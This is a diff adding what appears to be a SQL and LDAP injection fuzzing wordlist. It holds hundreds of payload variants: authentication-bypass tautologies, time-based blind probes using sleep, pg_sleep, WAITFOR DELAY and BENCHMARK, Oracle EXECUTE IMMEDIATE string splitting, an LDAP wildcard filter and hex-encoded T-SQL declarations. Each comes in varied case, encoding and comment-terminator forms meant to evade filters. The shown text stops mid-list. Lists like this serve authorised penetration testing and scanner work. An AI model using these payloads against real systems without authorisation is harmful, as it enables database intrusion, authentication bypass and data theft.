@@ -1,0 +1,1500 @@
+)%20or%20('x'='x
+)%20OR%20('X'='X
+)%20or%20('x'='x -- 
+)%20OR%20('X'='X -- 
+)%20or%20('x'='x -- -
+)%20OR%20('X'='X -- -
+)%20or%20('x'='x --+
+)%20OR%20('X'='X --+
+)%20or%20('x'='x #
+)%20OR%20('X'='X #
+)%20or%20('x'='x/*
+)%20OR%20('X'='X/*
+)%20or%20('x'='x %23
+)%20OR%20('X'='X %23
+)%20or%20('x'='x-- 
+)%20OR%20('X'='X-- 
+%20or%201=1
+%20OR%201=1
+%20or%201=1 -- 
+%20OR%201=1 -- 
+%20or%201=1 -- -
+%20OR%201=1 -- -
+%20or%201=1 --+
+%20OR%201=1 --+
+%20or%201=1 #
+%20OR%201=1 #
+%20or%201=1/*
+%20OR%201=1/*
+%20or%201=1 %23
+%20OR%201=1 %23
+%20or%201=1-- 
+%20OR%201=1-- 
+; execute immediate 'sel' || 'ect us' || 'er'
+; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'
+; execute immediate 'sel' || 'ect us' || 'er' -- 
+; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' -- 
+; execute immediate 'sel' || 'ect us' || 'er' -- -
+; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' -- -
+; execute immediate 'sel' || 'ect us' || 'er' --+
+; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' --+
+; execute immediate 'sel' || 'ect us' || 'er' #
+; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' #
+; execute immediate 'sel' || 'ect us' || 'er'/*
+; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'/*
+; execute immediate 'sel' || 'ect us' || 'er' %23
+; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' %23
+; execute immediate 'sel' || 'ect us' || 'er'-- 
+; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'-- 
+;/**/execute/**/immediate/**/'sel'/**/||/**/'ect/**/us'/**/||/**/'er'
+;/**/EXECUTE/**/IMMEDIATE/**/'SEL'/**/||/**/'ECT/**/US'/**/||/**/'ER'
+;/**/execute/**/immediate/**/'sel'/**/||/**/'ect/**/us'/**/||/**/'er' -- 
+;/**/EXECUTE/**/IMMEDIATE/**/'SEL'/**/||/**/'ECT/**/US'/**/||/**/'ER' -- 
+;/**/execute/**/immediate/**/'sel'/**/||/**/'ect/**/us'/**/||/**/'er' -- -
+;/**/EXECUTE/**/IMMEDIATE/**/'SEL'/**/||/**/'ECT/**/US'/**/||/**/'ER' -- -
+;/**/execute/**/immediate/**/'sel'/**/||/**/'ect/**/us'/**/||/**/'er' --+
+;/**/EXECUTE/**/IMMEDIATE/**/'SEL'/**/||/**/'ECT/**/US'/**/||/**/'ER' --+
+;/**/execute/**/immediate/**/'sel'/**/||/**/'ect/**/us'/**/||/**/'er' #
+;/**/EXECUTE/**/IMMEDIATE/**/'SEL'/**/||/**/'ECT/**/US'/**/||/**/'ER' #
+;/**/execute/**/immediate/**/'sel'/**/||/**/'ect/**/us'/**/||/**/'er'/*
+;/**/EXECUTE/**/IMMEDIATE/**/'SEL'/**/||/**/'ECT/**/US'/**/||/**/'ER'/*
+;/**/execute/**/immediate/**/'sel'/**/||/**/'ect/**/us'/**/||/**/'er' %23
+;/**/EXECUTE/**/IMMEDIATE/**/'SEL'/**/||/**/'ECT/**/US'/**/||/**/'ER' %23
+;/**/execute/**/immediate/**/'sel'/**/||/**/'ect/**/us'/**/||/**/'er'-- 
+;/**/EXECUTE/**/IMMEDIATE/**/'SEL'/**/||/**/'ECT/**/US'/**/||/**/'ER'-- 
+;%20execute%20immediate%20'sel'%20||%20'ect%20us'%20||%20'er'
+;%20EXECUTE%20IMMEDIATE%20'SEL'%20||%20'ECT%20US'%20||%20'ER'
+;%20execute%20immediate%20'sel'%20||%20'ect%20us'%20||%20'er' -- 
+;%20EXECUTE%20IMMEDIATE%20'SEL'%20||%20'ECT%20US'%20||%20'ER' -- 
+;%20execute%20immediate%20'sel'%20||%20'ect%20us'%20||%20'er' -- -
+;%20EXECUTE%20IMMEDIATE%20'SEL'%20||%20'ECT%20US'%20||%20'ER' -- -
+;%20execute%20immediate%20'sel'%20||%20'ect%20us'%20||%20'er' --+
+;%20EXECUTE%20IMMEDIATE%20'SEL'%20||%20'ECT%20US'%20||%20'ER' --+
+;%20execute%20immediate%20'sel'%20||%20'ect%20us'%20||%20'er' #
+;%20EXECUTE%20IMMEDIATE%20'SEL'%20||%20'ECT%20US'%20||%20'ER' #
+;%20execute%20immediate%20'sel'%20||%20'ect%20us'%20||%20'er'/*
+;%20EXECUTE%20IMMEDIATE%20'SEL'%20||%20'ECT%20US'%20||%20'ER'/*
+;%20execute%20immediate%20'sel'%20||%20'ect%20us'%20||%20'er' %23
+;%20EXECUTE%20IMMEDIATE%20'SEL'%20||%20'ECT%20US'%20||%20'ER' %23
+;%20execute%20immediate%20'sel'%20||%20'ect%20us'%20||%20'er'-- 
+;%20EXECUTE%20IMMEDIATE%20'SEL'%20||%20'ECT%20US'%20||%20'ER'-- 
+;+execute+immediate+'sel'+||+'ect+us'+||+'er'
+;+EXECUTE+IMMEDIATE+'SEL'+||+'ECT+US'+||+'ER'
+;+execute+immediate+'sel'+||+'ect+us'+||+'er' -- 
+;+EXECUTE+IMMEDIATE+'SEL'+||+'ECT+US'+||+'ER' -- 
+;+execute+immediate+'sel'+||+'ect+us'+||+'er' -- -
+;+EXECUTE+IMMEDIATE+'SEL'+||+'ECT+US'+||+'ER' -- -
+;+execute+immediate+'sel'+||+'ect+us'+||+'er' --+
+;+EXECUTE+IMMEDIATE+'SEL'+||+'ECT+US'+||+'ER' --+
+;+execute+immediate+'sel'+||+'ect+us'+||+'er' #
+;+EXECUTE+IMMEDIATE+'SEL'+||+'ECT+US'+||+'ER' #
+;+execute+immediate+'sel'+||+'ect+us'+||+'er'/*
+;+EXECUTE+IMMEDIATE+'SEL'+||+'ECT+US'+||+'ER'/*
+;+execute+immediate+'sel'+||+'ect+us'+||+'er' %23
+;+EXECUTE+IMMEDIATE+'SEL'+||+'ECT+US'+||+'ER' %23
+;+execute+immediate+'sel'+||+'ect+us'+||+'er'-- 
+;+EXECUTE+IMMEDIATE+'SEL'+||+'ECT+US'+||+'ER'-- 
+;\texecute\timmediate\t'sel'\t||\t'ect\tus'\t||\t'er'
+;\tEXECUTE\tIMMEDIATE\t'SEL'\t||\t'ECT\tUS'\t||\t'ER'
+;\texecute\timmediate\t'sel'\t||\t'ect\tus'\t||\t'er' -- 
+;\tEXECUTE\tIMMEDIATE\t'SEL'\t||\t'ECT\tUS'\t||\t'ER' -- 
+;\texecute\timmediate\t'sel'\t||\t'ect\tus'\t||\t'er' -- -
+;\tEXECUTE\tIMMEDIATE\t'SEL'\t||\t'ECT\tUS'\t||\t'ER' -- -
+;\texecute\timmediate\t'sel'\t||\t'ect\tus'\t||\t'er' --+
+;\tEXECUTE\tIMMEDIATE\t'SEL'\t||\t'ECT\tUS'\t||\t'ER' --+
+;\texecute\timmediate\t'sel'\t||\t'ect\tus'\t||\t'er' #
+;\tEXECUTE\tIMMEDIATE\t'SEL'\t||\t'ECT\tUS'\t||\t'ER' #
+;\texecute\timmediate\t'sel'\t||\t'ect\tus'\t||\t'er'/*
+;\tEXECUTE\tIMMEDIATE\t'SEL'\t||\t'ECT\tUS'\t||\t'ER'/*
+;\texecute\timmediate\t'sel'\t||\t'ect\tus'\t||\t'er' %23
+;\tEXECUTE\tIMMEDIATE\t'SEL'\t||\t'ECT\tUS'\t||\t'ER' %23
+;\texecute\timmediate\t'sel'\t||\t'ect\tus'\t||\t'er'-- 
+;\tEXECUTE\tIMMEDIATE\t'SEL'\t||\t'ECT\tUS'\t||\t'ER'-- 
+benchmark(10000000,MD5(1))#
+benchmark(10000000,md5(1))#
+BENCHMARK(10000000,MD5(1))#
+benchmark(10000000,MD5(1))# -- 
+benchmark(10000000,md5(1))# -- 
+BENCHMARK(10000000,MD5(1))# -- 
+benchmark(10000000,MD5(1))# -- -
+benchmark(10000000,md5(1))# -- -
+BENCHMARK(10000000,MD5(1))# -- -
+benchmark(10000000,MD5(1))# --+
+benchmark(10000000,md5(1))# --+
+BENCHMARK(10000000,MD5(1))# --+
+benchmark(10000000,MD5(1))# #
+benchmark(10000000,md5(1))# #
+BENCHMARK(10000000,MD5(1))# #
+benchmark(10000000,MD5(1))#/*
+benchmark(10000000,md5(1))#/*
+BENCHMARK(10000000,MD5(1))#/*
+benchmark(10000000,MD5(1))# %23
+benchmark(10000000,md5(1))# %23
+BENCHMARK(10000000,MD5(1))# %23
+benchmark(10000000,MD5(1))#-- 
+benchmark(10000000,md5(1))#-- 
+BENCHMARK(10000000,MD5(1))#-- 
+update
+UPDATE
+update -- 
+UPDATE -- 
+update -- -
+UPDATE -- -
+update --+
+UPDATE --+
+update #
+UPDATE #
+update/*
+UPDATE/*
+update %23
+UPDATE %23
+update-- 
+UPDATE-- 
+\";waitfor delay '0:0:5'--
+\";WAITFOR DELAY '0:0:5'--
+\";waitfor delay '0:0:5'-- -- 
+\";WAITFOR DELAY '0:0:5'-- -- 
+\";waitfor delay '0:0:5'-- -- -
+\";WAITFOR DELAY '0:0:5'-- -- -
+\";waitfor delay '0:0:5'-- --+
+\";WAITFOR DELAY '0:0:5'-- --+
+\";waitfor delay '0:0:5'-- #
+\";WAITFOR DELAY '0:0:5'-- #
+\";waitfor delay '0:0:5'--/*
+\";WAITFOR DELAY '0:0:5'--/*
+\";waitfor delay '0:0:5'-- %23
+\";WAITFOR DELAY '0:0:5'-- %23
+\";waitfor delay '0:0:5'---- 
+\";WAITFOR DELAY '0:0:5'---- 
+\";waitfor/**/delay/**/'0:0:5'--
+\";WAITFOR/**/DELAY/**/'0:0:5'--
+\";waitfor/**/delay/**/'0:0:5'-- -- 
+\";WAITFOR/**/DELAY/**/'0:0:5'-- -- 
+\";waitfor/**/delay/**/'0:0:5'-- -- -
+\";WAITFOR/**/DELAY/**/'0:0:5'-- -- -
+\";waitfor/**/delay/**/'0:0:5'-- --+
+\";WAITFOR/**/DELAY/**/'0:0:5'-- --+
+\";waitfor/**/delay/**/'0:0:5'-- #
+\";WAITFOR/**/DELAY/**/'0:0:5'-- #
+\";waitfor/**/delay/**/'0:0:5'--/*
+\";WAITFOR/**/DELAY/**/'0:0:5'--/*
+\";waitfor/**/delay/**/'0:0:5'-- %23
+\";WAITFOR/**/DELAY/**/'0:0:5'-- %23
+\";waitfor/**/delay/**/'0:0:5'---- 
+\";WAITFOR/**/DELAY/**/'0:0:5'---- 
+\";waitfor%20delay%20'0:0:5'--
+\";WAITFOR%20DELAY%20'0:0:5'--
+\";waitfor%20delay%20'0:0:5'-- -- 
+\";WAITFOR%20DELAY%20'0:0:5'-- -- 
+\";waitfor%20delay%20'0:0:5'-- -- -
+\";WAITFOR%20DELAY%20'0:0:5'-- -- -
+\";waitfor%20delay%20'0:0:5'-- --+
+\";WAITFOR%20DELAY%20'0:0:5'-- --+
+\";waitfor%20delay%20'0:0:5'-- #
+\";WAITFOR%20DELAY%20'0:0:5'-- #
+\";waitfor%20delay%20'0:0:5'--/*
+\";WAITFOR%20DELAY%20'0:0:5'--/*
+\";waitfor%20delay%20'0:0:5'-- %23
+\";WAITFOR%20DELAY%20'0:0:5'-- %23
+\";waitfor%20delay%20'0:0:5'---- 
+\";WAITFOR%20DELAY%20'0:0:5'---- 
+\";waitfor+delay+'0:0:5'--
+\";WAITFOR+DELAY+'0:0:5'--
+\";waitfor+delay+'0:0:5'-- -- 
+\";WAITFOR+DELAY+'0:0:5'-- -- 
+\";waitfor+delay+'0:0:5'-- -- -
+\";WAITFOR+DELAY+'0:0:5'-- -- -
+\";waitfor+delay+'0:0:5'-- --+
+\";WAITFOR+DELAY+'0:0:5'-- --+
+\";waitfor+delay+'0:0:5'-- #
+\";WAITFOR+DELAY+'0:0:5'-- #
+\";waitfor+delay+'0:0:5'--/*
+\";WAITFOR+DELAY+'0:0:5'--/*
+\";waitfor+delay+'0:0:5'-- %23
+\";WAITFOR+DELAY+'0:0:5'-- %23
+\";waitfor+delay+'0:0:5'---- 
+\";WAITFOR+DELAY+'0:0:5'---- 
+\";waitfor\tdelay\t'0:0:5'--
+\";WAITFOR\tDELAY\t'0:0:5'--
+\";waitfor\tdelay\t'0:0:5'-- -- 
+\";WAITFOR\tDELAY\t'0:0:5'-- -- 
+\";waitfor\tdelay\t'0:0:5'-- -- -
+\";WAITFOR\tDELAY\t'0:0:5'-- -- -
+\";waitfor\tdelay\t'0:0:5'-- --+
+\";WAITFOR\tDELAY\t'0:0:5'-- --+
+\";waitfor\tdelay\t'0:0:5'-- #
+\";WAITFOR\tDELAY\t'0:0:5'-- #
+\";waitfor\tdelay\t'0:0:5'--/*
+\";WAITFOR\tDELAY\t'0:0:5'--/*
+\";waitfor\tdelay\t'0:0:5'-- %23
+\";WAITFOR\tDELAY\t'0:0:5'-- %23
+\";waitfor\tdelay\t'0:0:5'---- 
+\";WAITFOR\tDELAY\t'0:0:5'---- 
+1) or pg_sleep(5)--
+1) OR PG_SLEEP(5)--
+1) or pg_sleep(5)-- -- 
+1) OR PG_SLEEP(5)-- -- 
+1) or pg_sleep(5)-- -- -
+1) OR PG_SLEEP(5)-- -- -
+1) or pg_sleep(5)-- --+
+1) OR PG_SLEEP(5)-- --+
+1) or pg_sleep(5)-- #
+1) OR PG_SLEEP(5)-- #
+1) or pg_sleep(5)--/*
+1) OR PG_SLEEP(5)--/*
+1) or pg_sleep(5)-- %23
+1) OR PG_SLEEP(5)-- %23
+1) or pg_sleep(5)---- 
+1) OR PG_SLEEP(5)---- 
+1)/**/or/**/pg_sleep(5)--
+1)/**/OR/**/PG_SLEEP(5)--
+1)/**/or/**/pg_sleep(5)-- -- 
+1)/**/OR/**/PG_SLEEP(5)-- -- 
+1)/**/or/**/pg_sleep(5)-- -- -
+1)/**/OR/**/PG_SLEEP(5)-- -- -
+1)/**/or/**/pg_sleep(5)-- --+
+1)/**/OR/**/PG_SLEEP(5)-- --+
+1)/**/or/**/pg_sleep(5)-- #
+1)/**/OR/**/PG_SLEEP(5)-- #
+1)/**/or/**/pg_sleep(5)--/*
+1)/**/OR/**/PG_SLEEP(5)--/*
+1)/**/or/**/pg_sleep(5)-- %23
+1)/**/OR/**/PG_SLEEP(5)-- %23
+1)/**/or/**/pg_sleep(5)---- 
+1)/**/OR/**/PG_SLEEP(5)---- 
+1)%20or%20pg_sleep(5)--
+1)%20OR%20PG_SLEEP(5)--
+1)%20or%20pg_sleep(5)-- -- 
+1)%20OR%20PG_SLEEP(5)-- -- 
+1)%20or%20pg_sleep(5)-- -- -
+1)%20OR%20PG_SLEEP(5)-- -- -
+1)%20or%20pg_sleep(5)-- --+
+1)%20OR%20PG_SLEEP(5)-- --+
+1)%20or%20pg_sleep(5)-- #
+1)%20OR%20PG_SLEEP(5)-- #
+1)%20or%20pg_sleep(5)--/*
+1)%20OR%20PG_SLEEP(5)--/*
+1)%20or%20pg_sleep(5)-- %23
+1)%20OR%20PG_SLEEP(5)-- %23
+1)%20or%20pg_sleep(5)---- 
+1)%20OR%20PG_SLEEP(5)---- 
+1)+or+pg_sleep(5)--
+1)+OR+PG_SLEEP(5)--
+1)+or+pg_sleep(5)-- -- 
+1)+OR+PG_SLEEP(5)-- -- 
+1)+or+pg_sleep(5)-- -- -
+1)+OR+PG_SLEEP(5)-- -- -
+1)+or+pg_sleep(5)-- --+
+1)+OR+PG_SLEEP(5)-- --+
+1)+or+pg_sleep(5)-- #
+1)+OR+PG_SLEEP(5)-- #
+1)+or+pg_sleep(5)--/*
+1)+OR+PG_SLEEP(5)--/*
+1)+or+pg_sleep(5)-- %23
+1)+OR+PG_SLEEP(5)-- %23
+1)+or+pg_sleep(5)---- 
+1)+OR+PG_SLEEP(5)---- 
+1)\tor\tpg_sleep(5)--
+1)\tOR\tPG_SLEEP(5)--
+1)\tor\tpg_sleep(5)-- -- 
+1)\tOR\tPG_SLEEP(5)-- -- 
+1)\tor\tpg_sleep(5)-- -- -
+1)\tOR\tPG_SLEEP(5)-- -- -
+1)\tor\tpg_sleep(5)-- --+
+1)\tOR\tPG_SLEEP(5)-- --+
+1)\tor\tpg_sleep(5)-- #
+1)\tOR\tPG_SLEEP(5)-- #
+1)\tor\tpg_sleep(5)--/*
+1)\tOR\tPG_SLEEP(5)--/*
+1)\tor\tpg_sleep(5)-- %23
+1)\tOR\tPG_SLEEP(5)-- %23
+1)\tor\tpg_sleep(5)---- 
+1)\tOR\tPG_SLEEP(5)---- 
+||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+||(ELT(-3+5,BIN(15),ORD(10),HEX(CHAR(45))))
+||(elt(-3+5,bin(15),ord(10),hex(char(45)))) -- 
+||(ELT(-3+5,BIN(15),ORD(10),HEX(CHAR(45)))) -- 
+||(elt(-3+5,bin(15),ord(10),hex(char(45)))) -- -
+||(ELT(-3+5,BIN(15),ORD(10),HEX(CHAR(45)))) -- -
+||(elt(-3+5,bin(15),ord(10),hex(char(45)))) --+
+||(ELT(-3+5,BIN(15),ORD(10),HEX(CHAR(45)))) --+
+||(elt(-3+5,bin(15),ord(10),hex(char(45)))) #
+||(ELT(-3+5,BIN(15),ORD(10),HEX(CHAR(45)))) #
+||(elt(-3+5,bin(15),ord(10),hex(char(45))))/*
+||(ELT(-3+5,BIN(15),ORD(10),HEX(CHAR(45))))/*
+||(elt(-3+5,bin(15),ord(10),hex(char(45)))) %23
+||(ELT(-3+5,BIN(15),ORD(10),HEX(CHAR(45)))) %23
+||(elt(-3+5,bin(15),ord(10),hex(char(45))))-- 
+||(ELT(-3+5,BIN(15),ORD(10),HEX(CHAR(45))))-- 
+\"hi\"\") or (\"\"a\"\"=\"\"a\"
+\"HI\"\") OR (\"\"A\"\"=\"\"A\"
+\"hi\"\") or (\"\"a\"\"=\"\"a\" -- 
+\"HI\"\") OR (\"\"A\"\"=\"\"A\" -- 
+\"hi\"\") or (\"\"a\"\"=\"\"a\" -- -
+\"HI\"\") OR (\"\"A\"\"=\"\"A\" -- -
+\"hi\"\") or (\"\"a\"\"=\"\"a\" --+
+\"HI\"\") OR (\"\"A\"\"=\"\"A\" --+
+\"hi\"\") or (\"\"a\"\"=\"\"a\" #
+\"HI\"\") OR (\"\"A\"\"=\"\"A\" #
+\"hi\"\") or (\"\"a\"\"=\"\"a\"/*
+\"HI\"\") OR (\"\"A\"\"=\"\"A\"/*
+\"hi\"\") or (\"\"a\"\"=\"\"a\" %23
+\"HI\"\") OR (\"\"A\"\"=\"\"A\" %23
+\"hi\"\") or (\"\"a\"\"=\"\"a\"-- 
+\"HI\"\") OR (\"\"A\"\"=\"\"A\"-- 
+\"hi\"\")/**/or/**/(\"\"a\"\"=\"\"a\"
+\"HI\"\")/**/OR/**/(\"\"A\"\"=\"\"A\"
+\"hi\"\")/**/or/**/(\"\"a\"\"=\"\"a\" -- 
+\"HI\"\")/**/OR/**/(\"\"A\"\"=\"\"A\" -- 
+\"hi\"\")/**/or/**/(\"\"a\"\"=\"\"a\" -- -
+\"HI\"\")/**/OR/**/(\"\"A\"\"=\"\"A\" -- -
+\"hi\"\")/**/or/**/(\"\"a\"\"=\"\"a\" --+
+\"HI\"\")/**/OR/**/(\"\"A\"\"=\"\"A\" --+
+\"hi\"\")/**/or/**/(\"\"a\"\"=\"\"a\" #
+\"HI\"\")/**/OR/**/(\"\"A\"\"=\"\"A\" #
+\"hi\"\")/**/or/**/(\"\"a\"\"=\"\"a\"/*
+\"HI\"\")/**/OR/**/(\"\"A\"\"=\"\"A\"/*
+\"hi\"\")/**/or/**/(\"\"a\"\"=\"\"a\" %23
+\"HI\"\")/**/OR/**/(\"\"A\"\"=\"\"A\" %23
+\"hi\"\")/**/or/**/(\"\"a\"\"=\"\"a\"-- 
+\"HI\"\")/**/OR/**/(\"\"A\"\"=\"\"A\"-- 
+\"hi\"\")%20or%20(\"\"a\"\"=\"\"a\"
+\"HI\"\")%20OR%20(\"\"A\"\"=\"\"A\"
+\"hi\"\")%20or%20(\"\"a\"\"=\"\"a\" -- 
+\"HI\"\")%20OR%20(\"\"A\"\"=\"\"A\" -- 
+\"hi\"\")%20or%20(\"\"a\"\"=\"\"a\" -- -
+\"HI\"\")%20OR%20(\"\"A\"\"=\"\"A\" -- -
+\"hi\"\")%20or%20(\"\"a\"\"=\"\"a\" --+
+\"HI\"\")%20OR%20(\"\"A\"\"=\"\"A\" --+
+\"hi\"\")%20or%20(\"\"a\"\"=\"\"a\" #
+\"HI\"\")%20OR%20(\"\"A\"\"=\"\"A\" #
+\"hi\"\")%20or%20(\"\"a\"\"=\"\"a\"/*
+\"HI\"\")%20OR%20(\"\"A\"\"=\"\"A\"/*
+\"hi\"\")%20or%20(\"\"a\"\"=\"\"a\" %23
+\"HI\"\")%20OR%20(\"\"A\"\"=\"\"A\" %23
+\"hi\"\")%20or%20(\"\"a\"\"=\"\"a\"-- 
+\"HI\"\")%20OR%20(\"\"A\"\"=\"\"A\"-- 
+\"hi\"\")+or+(\"\"a\"\"=\"\"a\"
+\"HI\"\")+OR+(\"\"A\"\"=\"\"A\"
+\"hi\"\")+or+(\"\"a\"\"=\"\"a\" -- 
+\"HI\"\")+OR+(\"\"A\"\"=\"\"A\" -- 
+\"hi\"\")+or+(\"\"a\"\"=\"\"a\" -- -
+\"HI\"\")+OR+(\"\"A\"\"=\"\"A\" -- -
+\"hi\"\")+or+(\"\"a\"\"=\"\"a\" --+
+\"HI\"\")+OR+(\"\"A\"\"=\"\"A\" --+
+\"hi\"\")+or+(\"\"a\"\"=\"\"a\" #
+\"HI\"\")+OR+(\"\"A\"\"=\"\"A\" #
+\"hi\"\")+or+(\"\"a\"\"=\"\"a\"/*
+\"HI\"\")+OR+(\"\"A\"\"=\"\"A\"/*
+\"hi\"\")+or+(\"\"a\"\"=\"\"a\" %23
+\"HI\"\")+OR+(\"\"A\"\"=\"\"A\" %23
+\"hi\"\")+or+(\"\"a\"\"=\"\"a\"-- 
+\"HI\"\")+OR+(\"\"A\"\"=\"\"A\"-- 
+\"hi\"\")\tor\t(\"\"a\"\"=\"\"a\"
+\"HI\"\")\tOR\t(\"\"A\"\"=\"\"A\"
+\"hi\"\")\tor\t(\"\"a\"\"=\"\"a\" -- 
+\"HI\"\")\tOR\t(\"\"A\"\"=\"\"A\" -- 
+\"hi\"\")\tor\t(\"\"a\"\"=\"\"a\" -- -
+\"HI\"\")\tOR\t(\"\"A\"\"=\"\"A\" -- -
+\"hi\"\")\tor\t(\"\"a\"\"=\"\"a\" --+
+\"HI\"\")\tOR\t(\"\"A\"\"=\"\"A\" --+
+\"hi\"\")\tor\t(\"\"a\"\"=\"\"a\" #
+\"HI\"\")\tOR\t(\"\"A\"\"=\"\"A\" #
+\"hi\"\")\tor\t(\"\"a\"\"=\"\"a\"/*
+\"HI\"\")\tOR\t(\"\"A\"\"=\"\"A\"/*
+\"hi\"\")\tor\t(\"\"a\"\"=\"\"a\" %23
+\"HI\"\")\tOR\t(\"\"A\"\"=\"\"A\" %23
+\"hi\"\")\tor\t(\"\"a\"\"=\"\"a\"-- 
+\"HI\"\")\tOR\t(\"\"A\"\"=\"\"A\"-- 
+delete
+DELETE
+delete -- 
+DELETE -- 
+delete -- -
+DELETE -- -
+delete --+
+DELETE --+
+delete #
+DELETE #
+delete/*
+DELETE/*
+delete %23
+DELETE %23
+delete-- 
+DELETE-- 
+like
+LIKE
+like -- 
+LIKE -- 
+like -- -
+LIKE -- -
+like --+
+LIKE --+
+like #
+LIKE #
+like/*
+LIKE/*
+like %23
+LIKE %23
+like-- 
+LIKE-- 
+\" or sleep(5)#
+\" OR SLEEP(5)#
+\" or sleep(5)# -- 
+\" OR SLEEP(5)# -- 
+\" or sleep(5)# -- -
+\" OR SLEEP(5)# -- -
+\" or sleep(5)# --+
+\" OR SLEEP(5)# --+
+\" or sleep(5)# #
+\" OR SLEEP(5)# #
+\" or sleep(5)#/*
+\" OR SLEEP(5)#/*
+\" or sleep(5)# %23
+\" OR SLEEP(5)# %23
+\" or sleep(5)#-- 
+\" OR SLEEP(5)#-- 
+\"/**/or/**/sleep(5)#
+\"/**/OR/**/SLEEP(5)#
+\"/**/or/**/sleep(5)# -- 
+\"/**/OR/**/SLEEP(5)# -- 
+\"/**/or/**/sleep(5)# -- -
+\"/**/OR/**/SLEEP(5)# -- -
+\"/**/or/**/sleep(5)# --+
+\"/**/OR/**/SLEEP(5)# --+
+\"/**/or/**/sleep(5)# #
+\"/**/OR/**/SLEEP(5)# #
+\"/**/or/**/sleep(5)#/*
+\"/**/OR/**/SLEEP(5)#/*
+\"/**/or/**/sleep(5)# %23
+\"/**/OR/**/SLEEP(5)# %23
+\"/**/or/**/sleep(5)#-- 
+\"/**/OR/**/SLEEP(5)#-- 
+\"%20or%20sleep(5)#
+\"%20OR%20SLEEP(5)#
+\"%20or%20sleep(5)# -- 
+\"%20OR%20SLEEP(5)# -- 
+\"%20or%20sleep(5)# -- -
+\"%20OR%20SLEEP(5)# -- -
+\"%20or%20sleep(5)# --+
+\"%20OR%20SLEEP(5)# --+
+\"%20or%20sleep(5)# #
+\"%20OR%20SLEEP(5)# #
+\"%20or%20sleep(5)#/*
+\"%20OR%20SLEEP(5)#/*
+\"%20or%20sleep(5)# %23
+\"%20OR%20SLEEP(5)# %23
+\"%20or%20sleep(5)#-- 
+\"%20OR%20SLEEP(5)#-- 
+\"+or+sleep(5)#
+\"+OR+SLEEP(5)#
+\"+or+sleep(5)# -- 
+\"+OR+SLEEP(5)# -- 
+\"+or+sleep(5)# -- -
+\"+OR+SLEEP(5)# -- -
+\"+or+sleep(5)# --+
+\"+OR+SLEEP(5)# --+
+\"+or+sleep(5)# #
+\"+OR+SLEEP(5)# #
+\"+or+sleep(5)#/*
+\"+OR+SLEEP(5)#/*
+\"+or+sleep(5)# %23
+\"+OR+SLEEP(5)# %23
+\"+or+sleep(5)#-- 
+\"+OR+SLEEP(5)#-- 
+\"\tor\tsleep(5)#
+\"\tOR\tSLEEP(5)#
+\"\tor\tsleep(5)# -- 
+\"\tOR\tSLEEP(5)# -- 
+\"\tor\tsleep(5)# -- -
+\"\tOR\tSLEEP(5)# -- -
+\"\tor\tsleep(5)# --+
+\"\tOR\tSLEEP(5)# --+
+\"\tor\tsleep(5)# #
+\"\tOR\tSLEEP(5)# #
+\"\tor\tsleep(5)#/*
+\"\tOR\tSLEEP(5)#/*
+\"\tor\tsleep(5)# %23
+\"\tOR\tSLEEP(5)# %23
+\"\tor\tsleep(5)#-- 
+\"\tOR\tSLEEP(5)#-- 
+pg_sleep(5)--
+PG_SLEEP(5)--
+pg_sleep(5)-- -- 
+PG_SLEEP(5)-- -- 
+pg_sleep(5)-- -- -
+PG_SLEEP(5)-- -- -
+pg_sleep(5)-- --+
+PG_SLEEP(5)-- --+
+pg_sleep(5)-- #
+PG_SLEEP(5)-- #
+pg_sleep(5)--/*
+PG_SLEEP(5)--/*
+pg_sleep(5)-- %23
+PG_SLEEP(5)-- %23
+pg_sleep(5)---- 
+PG_SLEEP(5)---- 
+*(|(objectclass=*))
+*(|(OBJECTCLASS=*))
+*(|(objectclass=*)) -- 
+*(|(OBJECTCLASS=*)) -- 
+*(|(objectclass=*)) -- -
+*(|(OBJECTCLASS=*)) -- -
+*(|(objectclass=*)) --+
+*(|(OBJECTCLASS=*)) --+
+*(|(objectclass=*)) #
+*(|(OBJECTCLASS=*)) #
+*(|(objectclass=*))/*
+*(|(OBJECTCLASS=*))/*
+*(|(objectclass=*)) %23
+*(|(OBJECTCLASS=*)) %23
+*(|(objectclass=*))-- 
+*(|(OBJECTCLASS=*))-- 
+declare @q nvarchar (200) 0x730065006c00650063 ...
+DECLARE @Q NVARCHAR (200) 0X730065006C00650063 ...
+declare @q nvarchar (200) 0x730065006c00650063 ... -- 
+DECLARE @Q NVARCHAR (200) 0X730065006C00650063 ... -- 
+declare @q nvarchar (200) 0x730065006c00650063 ... -- -
+DECLARE @Q NVARCHAR (200) 0X730065006C00650063 ... -- -
+declare @q nvarchar (200) 0x730065006c00650063 ... --+
+DECLARE @Q NVARCHAR (200) 0X730065006C00650063 ... --+
+declare @q nvarchar (200) 0x730065006c00650063 ... #
+DECLARE @Q NVARCHAR (200) 0X730065006C00650063 ... #
+declare @q nvarchar (200) 0x730065006c00650063 .../*
+DECLARE @Q NVARCHAR (200) 0X730065006C00650063 .../*
+declare @q nvarchar (200) 0x730065006c00650063 ... %23
+DECLARE @Q NVARCHAR (200) 0X730065006C00650063 ... %23
+declare @q nvarchar (200) 0x730065006c00650063 ...-- 
+DECLARE @Q NVARCHAR (200) 0X730065006C00650063 ...-- 
+declare/**/@q/**/nvarchar/**/(200)/**/0x730065006c00650063/**/...
+DECLARE/**/@Q/**/NVARCHAR/**/(200)/**/0X730065006C00650063/**/...
+declare/**/@q/**/nvarchar/**/(200)/**/0x730065006c00650063/**/... -- 
+DECLARE/**/@Q/**/NVARCHAR/**/(200)/**/0X730065006C00650063/**/... -- 
+declare/**/@q/**/nvarchar/**/(200)/**/0x730065006c00650063/**/... -- -
+DECLARE/**/@Q/**/NVARCHAR/**/(200)/**/0X730065006C00650063/**/... -- -
+declare/**/@q/**/nvarchar/**/(200)/**/0x730065006c00650063/**/... --+
+DECLARE/**/@Q/**/NVARCHAR/**/(200)/**/0X730065006C00650063/**/... --+
+declare/**/@q/**/nvarchar/**/(200)/**/0x730065006c00650063/**/... #
+DECLARE/**/@Q/**/NVARCHAR/**/(200)/**/0X730065006C00650063/**/... #
+declare/**/@q/**/nvarchar/**/(200)/**/0x730065006c00650063/**/.../*
